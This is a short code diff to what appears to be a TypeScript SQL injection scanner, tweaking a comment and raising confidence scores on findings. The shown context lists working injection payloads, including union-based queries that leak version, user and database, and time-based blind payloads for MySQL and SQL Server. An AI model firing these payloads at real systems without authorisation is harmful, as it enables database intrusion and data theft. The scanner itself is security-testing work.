@@ -96,7 +96,7 @@ const SQL_PAYLOADS: SQLPayload[] = [
   { payload: `' UNION SELECT 1,2,3--`, type: 'Union-based', severity: 'critical', confidence: 0.9 },
   { payload: `-1' UNION SELECT @@version, user(), database()--`, type: 'Union-based (Info Leak)', severity: 'critical', confidence: 0.98 },
 
-  // --- Time-based Blind (Database Specific) ---
+  // --- Time-based Blind (Critical for Data Exfiltration) ---
   // Use a 5-second delay for high confidence detection
   { payload: `' AND SLEEP(5)--`, type: 'Time-based Blind (MySQL)', severity: 'critical', confidence: 1.0 }, 
   { payload: `1' WAITFOR DELAY '0:0:5'--`, type: 'Time-based Blind (SQL Server)', severity: 'critical', confidence: 1.0 }, 
@@ -278,7 +278,7 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
                 type,
                 evidence: `Server returned ${response.status} (baseline: ${baselineStatus})`,
                 parameter: paramKey,
-                confidence: 0.7,
+                confidence: 0.8, // Increased confidence to 0.8
               });
             }
           }
@@ -300,7 +300,7 @@ export const performSQLScan = async (target: string, requestManager: RequestMana
                   type,
                   evidence: `Response size: ${text.length} bytes (baseline: ${baselineLength}, diff: ${percentDiff.toFixed(1)}%)`,
                   parameter: paramKey,
-                  confidence: 0.6, 
+                  confidence: 0.7, // Increased confidence to 0.7
                 });
               }
             }
